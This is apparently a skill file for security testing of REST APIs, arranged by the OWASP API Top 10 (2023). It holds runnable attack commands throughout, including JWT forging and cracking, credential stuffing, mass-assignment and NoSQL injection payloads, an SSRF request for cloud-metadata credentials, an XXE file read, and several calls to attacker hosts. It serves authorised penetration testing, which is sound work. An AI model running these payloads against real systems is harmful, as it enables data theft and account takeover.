---
name: rest-api
description: REST/HTTP API security testing across the OWASP API Security Top 10 (2023) - spec discovery, BOLA/object-level authz, broken auth, mass assignment, resource consumption, function-level authz, SSRF, misconfiguration, and inventory management
---

# REST/HTTP API Security Testing

REST and JSON-over-HTTP APIs are the dominant attack surface for modern apps because the authorization logic that a server-rendered UI used to hide is now exposed directly to the client. The same endpoint serves web, mobile, and partner integrations, so the server is the only enforcement boundary — and it routinely fails to enforce per-object and per-function access control. The OWASP API Security Top 10 (2023) is organized around exactly these failures: authorization (API1/API3/API5), authentication (API2), resource abuse (API4/API6), and operational hygiene (API8/API9). Discovery is cheap (specs, JS bundles, mobile traffic) and the highest-yield bugs are logic flaws, not injection, so the load-bearing step is building a per-endpoint, per-role authorization matrix and probing every cell. Cross-reference idor, mass_assignment, authentication_jwt, broken_function_level_authorization, business_logic, and ssrf for the underlying primitives.

## Attack Surface

**Scope**
- All HTTP verbs against versioned and unversioned route prefixes (`/api`, `/api/v1`, `/v2`, `/rest`, `/graphql`)
- Documented endpoints plus shadow (undocumented), zombie (orphaned old versions), and deprecated routes still routable
- Authentication, token issuance, and refresh endpoints (`/auth/login`, `/oauth/token`, `/api/refresh`)
- File upload/download, export/report, webhook registration, and bulk/batch endpoints
- Backend-to-backend consumption of third-party APIs (payment, KYC, geocoding, OAuth providers)

**Entry Points**
- Machine-readable specs: `/openapi.json`, `/swagger.json`, `/v2/api-docs`, `/v3/api-docs`, `/api-docs`, `/swagger/v1/swagger.json`, `/swagger-ui/`, `/redoc`, Postman collection exports
- GraphQL introspection as a route pointer (`/graphql`, `/api/graphql`) — see graphql for the dedicated surface
- Client artifacts: JS bundles and sourcemaps (`main.*.js`, `*.js.map`) embedding base URLs and route tables, `robots.txt`, `sitemap.xml`, mobile-app traffic (decompiled APK/IPA strings, runtime proxy capture)
- WSDL/SOAP descriptors, `.well-known/` (OAuth/OIDC config at `/.well-known/openid-configuration`)
- Error pages and stack traces leaking framework, route names, and parameter signatures

**Authentication and identity schemes**
- Bearer/JWT in `Authorization: Bearer <jwt>` — inspect `alg`, `kid`, signature verification, expiry (see authentication_jwt)
- API keys in headers (`X-API-Key`, `apikey`), query string (`?api_key=`), or basic-auth username slot — often long-lived, broad-scoped, found in JS/mobile
- OAuth2 / OIDC access tokens, refresh tokens, scope and audience claims
- mTLS (client certificate) for partner/internal APIs; HMAC request signing (`X-Signature` over body+timestamp+nonce)
- Session cookies on hybrid APIs; CSRF relevance when cookies (not bearer headers) carry auth

## Key Vulnerabilities

### API1:2023 - Broken Object Level Authorization (BOLA)

The dominant API bug: an endpoint accepts an object identifier and returns/mutates it without checking the caller owns it. Tamper sequential IDs, UUIDs (predictable or leaked elsewhere), email/username keys, and IDs nested in the body or in a JWT-mismatched path. See idor for ID-prediction and oracle techniques.

**Test:**
```
# Two accounts: token A (victim obj 1001), token B (attacker). Try A's object with B's token.
curl -s -H "Authorization: Bearer $TOKEN_B" https://target/api/v1/users/1001/orders
ffuf -w ids.txt -u https://target/api/v1/invoices/FUZZ -H "Authorization: Bearer $TOKEN_B" \
  -mc 200 -fs 0 -o bola.json
curl -s -X PATCH -H "Authorization: Bearer $TOKEN_B" -H 'Content-Type: application/json' \
  -d '{"status":"paid"}' https://target/api/v1/invoices/1001
```

### API2:2023 - Broken Authentication

Missing or wrong signature verification, `alg:none`, weak HMAC secrets, accepting expired/revoked tokens, predictable reset tokens, credential stuffing with no rate limit, and OAuth flaws. See authentication_jwt for the full JWT matrix.

**Test:**
```
# Fingerprint and attack the JWT: none-alg, key confusion, weak HMAC secret.
jwt_tool "$JWT" -M at -t https://target/api/v1/me -rh "Authorization: Bearer $JWT"
jwt_tool "$JWT" -X a                         # forge alg:none
jwt_tool "$JWT" -C -d /opt/wordlists/jwt.secrets.txt   # crack HMAC secret
curl -s -H "Authorization: Bearer $FORGED_JWT" https://target/api/v1/admin/users
ffuf -w creds.txt:CRED -X POST -u https://target/auth/login -H 'Content-Type: application/json' \
  -d '{"user":"admin","pass":"CRED"}' -mc 200 -ac
```

### API3:2023 - Broken Object Property Level Authorization

Combines mass assignment (client sets server-controlled fields) and excessive data exposure (response returns more than the client needs). Add privileged keys to write bodies; read responses for fields the UI never shows. See mass_assignment.

**Test:**
```
# Mass assignment: inject privileged/internal properties into a create/update.
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"email":"x@x.com","role":"admin","is_verified":true,"account_balance":99999}' \
  https://target/api/v1/users
curl -s -X PATCH -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"id":2,"owner_id":2,"approved":true}' https://target/api/v1/projects/5
# Excessive data exposure: diff full response against UI-rendered fields.
curl -s -H "Authorization: Bearer $TOKEN" https://target/api/v1/users/me | jq 'keys'
```

### API4:2023 - Unrestricted Resource Consumption

No rate limiting, unbounded page sizes/limits, costly filters, file-size and batching abuse. Drives DoS and cost amplification.

**Test:**
```
# Rate-limit probe: burst and check for 429 / Retry-After.
seq 1 200 | xargs -P50 -I{} curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" https://target/api/v1/me | sort | uniq -c
curl -s -H "Authorization: Bearer $TOKEN" "https://target/api/v1/users?limit=1000000&page_size=100000"
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"ids":['"$(seq -s, 1 100000)"']}' https://target/api/v1/items/bulk
```

### API5:2023 - Broken Function Level Authorization

Admin/privileged functions reachable by lower-privilege users via guessed paths or HTTP verb tampering. See broken_function_level_authorization.

**Test:**
```
# Access admin functions with a non-admin token.
for p in /api/v1/admin/users /api/v1/admin/config /api/v1/internal/metrics; do
  curl -s -o /dev/null -w "%{http_code} $p\n" -H "Authorization: Bearer $TOKEN_USER" https://target$p
done
# Verb tampering: GET denied but PUT/DELETE/PATCH/HEAD permitted on same route.
for m in GET POST PUT DELETE PATCH HEAD OPTIONS; do
  curl -s -o /dev/null -w "%{http_code} $m\n" -X $m -H "Authorization: Bearer $TOKEN_USER" \
    https://target/api/v1/admin/users/1
done
kr scan https://target -w routes-large.kite -H "Authorization: Bearer $TOKEN_USER"
```

### API6:2023 - Unrestricted Access to Sensitive Business Flows

Automatable abuse of a flow without per-flow throttling/anti-automation: bulk purchase/scalping, coupon/referral farming, mass account or comment creation. See business_logic.

**Test:**
```
# Replay a sensitive flow at machine speed (e.g. apply coupon repeatedly, reserve inventory).
seq 1 500 | xargs -P25 -I{} curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"code":"SAVE50"}' \
  https://target/api/v1/cart/apply-coupon -o /dev/null -w "%{http_code}\n" | sort | uniq -c
curl -s -X POST -H "Authorization: Bearer $TOKEN" -d '{"order_id":"new"}' https://target/api/v1/checkout
```

### API7:2023 - Server-Side Request Forgery

Any field that takes a URL, hostname, webhook target, or file reference and is fetched server-side. See ssrf for cloud-metadata, gopher, and DNS-rebinding depth.

**Test:**
```
# URL-accepting fields: webhooks, import-from-URL, avatar/image fetch, PDF render callbacks.
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"webhook_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' \
  https://target/api/v1/integrations
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"image_url":"http://$(echo $OAST_DOMAIN)/x.png"}' https://target/api/v1/profile/avatar
```

### API8:2023 - Security Misconfiguration

Permissive CORS, verbose errors/stack traces, missing security headers, dangerous methods (TRACE/PUT/DELETE), default creds, unpatched components, and missing TLS hardening.

**Test:**
```
# CORS: does the server reflect an arbitrary Origin with credentials?
curl -s -I -H "Origin: https://evil.example" -H "Authorization: Bearer $TOKEN" \
  https://target/api/v1/me | grep -i 'access-control-allow-'
curl -s -X OPTIONS -i https://target/api/v1/users | grep -i '^Allow:'
curl -s -X TRACE -i https://target/ ; curl -s -X PUT --data 'x' -i https://target/api/v1/x.txt
curl -s -X POST -H 'Content-Type: application/json' -d '{"x":' https://target/api/v1/users
nuclei -u https://target -tags cors,exposure,misconfig,http -severity medium,high,critical
```

### API9:2023 - Improper Inventory Management

Old API versions, staging/dev hosts, and deprecated endpoints still live and often less protected than current production.

**Test:**
```
for v in v1 v2 v3 beta internal legacy; do
  curl -s -o /dev/null -w "%{http_code} /$v\n" https://target/api/$v/users
done
for h in api-staging api-dev api-test api-uat staging.api; do
  httpx -silent -u https://$h.target.com/api/v1/health -title -status-code
done
```

### API10:2023 - Unsafe Consumption of Third-Party APIs

The target trusts upstream third-party responses (redirects, data, error bodies) without validation, enabling injection or SSRF-like pivots when the upstream is attacker-influenceable.

**Test:**
```
# Poison an upstream the target consumes (webhook callback, OAuth userinfo) and return hostile data:
# malformed/oversized bodies, 3xx to internal hosts, or fields it persists unvalidated.
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"callback":"https://attacker-controlled-upstream/evil"}' https://target/api/v1/oauth/link
```

### Content-type confusion, parameter pollution, and pagination/filter injection

Switching `Content-Type` (JSON <-> form <-> XML) can route a request past validators or reach a different parser (XXE on XML). Duplicate parameters (HPP) resolve inconsistently across proxy/app. Filter/sort/pagination params often flow into SQL/NoSQL/ORM unsanitized.

**Test:**
```
# Content-type confusion: same params as form-encoded may skip JSON-schema validation.
curl -s -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'role=admin&user=x' https://target/api/v1/users
# Try XML body for an XXE-capable parser.
curl -s -X POST -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>' \
  https://target/api/v1/import
curl -s "https://target/api/v1/users?role=user&role=admin" -H "Authorization: Bearer $TOKEN"
# Filter/sort injection (cross-reference sql_injection).
curl -s "https://target/api/v1/users?sort=id;SELECT%20pg_sleep(5)--" -H "Authorization: Bearer $TOKEN"
curl -s -H "Authorization: Bearer $TOKEN" "https://target/api/v1/users?filter[role][\$ne]=null"
```

## Bypass Techniques

**Authorization-check evasion**
- Path tricks against gateway/app authz mismatch: `/api/v1/admin/..;/users`, trailing slash, `%2e`, double-encoding, case (`/ADMIN/`), and matrix params (`;`)
- Verb override headers: `X-HTTP-Method-Override: PUT`, `X-Method-Override`, `_method=DELETE` when the framework honors them
- Header-trust spoofing: `X-Forwarded-For`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Host` to fake internal origin or rewrite the routed path

**Identity and token games**
- Swap object IDs to match a different tenant while keeping your valid token (BOLA), or mismatch JWT `sub` against path ID
- Downgrade `Content-Type` or wrap the body to dodge schema-based field allowlists (mass assignment)

**Rate-limit and WAF evasion**
- Rotate `X-Forwarded-For`/source identifiers, spread across endpoints, or use GraphQL/batch endpoints that count as one request

## Testing Methodology

1. **Discover the spec** - Pull `/openapi.json`, `/swagger.json`, `/v3/api-docs`, Postman exports; harvest routes from JS bundles/sourcemaps and captured mobile traffic via mitmproxy. Import into Postman/newman or convert OpenAPI to an ffuf wordlist.
2. **Inventory endpoints** - Brute additional routes with kiterunner (`kr scan -w routes-large.kite`) and ffuf; enumerate versions and non-prod hosts with httpx.
3. **Map authentication** - Identify every scheme (Bearer/JWT, API key, OAuth2, mTLS, HMAC); obtain at least two accounts per role (low-priv, admin, second tenant) plus an unauthenticated baseline.
4. **Build the authz matrix** - For each endpoint x method x role, record expected vs observed (200/401/403). Every cell where a lower role gets data/action is API1/API5.
5. **Fuzz parameters** - Discover hidden params with arjun (`arjun -u <endpoint> -m GET,POST,JSON`); test each for mass assignment, injection, IDOR, and SSRF.
6. **Probe resource limits** - Rate limits, page sizes, batch arrays, costly filters (API4) and sensitive-flow automation (API6).
7. **Check misconfiguration** - CORS reflection, dangerous methods, verbose errors, missing headers; run nuclei tagged exposure/cors/misconfig and sqlmap on injectable params.
8. **Chain** - Combine: spec leak -> shadow endpoint -> BOLA read of another tenant -> mass-assignment privilege escalation -> admin function access -> SSRF to cloud metadata.

## Validation

1. Prove BOLA/BFLA with two real accounts: show account B reading or mutating account A's object, including the response body containing A's data.
2. For broken auth, show a forged/none-alg or cracked-secret token accepted on a protected endpoint (200 + privileged data), not merely a malformed-token rejection.
3. For mass assignment, GET the object back and confirm the injected privileged field (`role`, `is_admin`, `balance`) actually persisted.
4. For SSRF, show an OAST callback or returned internal/metadata content — not just a 200 on a URL field.
5. For resource consumption, demonstrate absence of 429 across a burst and a response time/size that scales with attacker-controlled limits — without exhausting the live service.
6. Capture full request/response pairs (headers + body) for each finding; replay must be deterministic.

## False Positives

- A 200 with empty/filtered body on an ID swap — the object exists but authorization stripped its contents (not a BOLA read).
- `alg:none` or modified token returning 401/403 — verification is working; only a 200 with privileged data is a finding.
- CORS reflecting Origin but with `Access-Control-Allow-Credentials: false` and no sensitive data — low/no impact for credentialed theft.
- Missing 429 behind an upstream gateway/WAF that enforces rate limiting out-of-band (verify at the edge before flagging API4).
- A privileged-looking field accepted in the request but ignored server-side — confirm persistence via read-back before claiming mass assignment.

## Impact

- Cross-tenant/cross-user data breach via BOLA and excessive data exposure (the most common real-world API breach pattern).
- Account takeover and privilege escalation via broken authentication and mass assignment.
- Full admin-function access through broken function-level authorization and shadow/old-version endpoints.
- SSRF to cloud metadata -> credential theft -> cloud account compromise.
- Denial of service and cost amplification from missing resource limits and batch abuse.

## Pro Tips

1. The spec is the map but not the territory — shadow and zombie endpoints (old versions, internal routes) are where authorization is weakest; always brute-force beyond what the spec lists.
2. Two accounts per role is the single highest-yield setup; nearly every API1/API3/API5 finding requires comparing what account B can do to account A's objects.
3. Run arjun against every endpoint — hidden parameters (`debug`, `admin`, `is_internal`, `_method`) routinely unlock mass assignment and verb override.
4. JSON keys are case- and whitespace-sensitive in some stacks but not others; when a privileged field is rejected, retry with casing variants and as a nested object before giving up.
5. Mobile traffic via mitmproxy reveals undocumented endpoints and long-lived API keys the web app never exposes — proxy the app early.
6. GraphQL and batch endpoints sidestep per-request rate limits; a single request can carry hundreds of operations (API4/API6) — count operations, not requests.

## Summary

API findings chain into breaches faster than almost any other surface because the server is the only authorization boundary and it routinely under-enforces. The workflow is mechanical: discover the spec and every shadow/old endpoint, enumerate auth schemes, obtain multi-role/multi-tenant accounts, then build and probe a full endpoint x method x role authorization matrix — the OWASP API Top 10 maps cleanly onto its cells. A leaked spec exposes a zombie v1 endpoint; BOLA on it reads another tenant; mass assignment escalates the attacker's role; broken function-level authorization unlocks admin functions; an SSRF field reaches cloud metadata for full account takeover. Test the chain, validate each link with two real accounts and captured request/response pairs, and prove impact without degrading the live service.
